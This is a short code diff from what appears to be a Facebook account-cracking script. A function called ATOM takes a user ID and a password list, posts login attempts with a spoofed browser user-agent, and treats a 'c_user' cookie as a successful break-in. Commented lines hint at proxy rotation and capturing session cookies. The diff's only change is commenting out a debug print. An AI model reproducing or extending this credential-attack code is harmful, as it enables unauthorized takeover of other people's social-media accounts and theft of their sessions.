@@ -159,7 +159,7 @@ def ATOM(uid, pww, total_idz):
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
             'viewport-width': '867',}
             response = session.post('https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028',cookies=cookies,headers=headers,data=data,allow_redirects=False) #proxies=proxs)
-            print(data)
+            #print(data)
             log_cookies = session.cookies.get_dict().keys()
             if "c_user" in log_cookies:
                 #kuki = convert(session.cookies.get_dict())
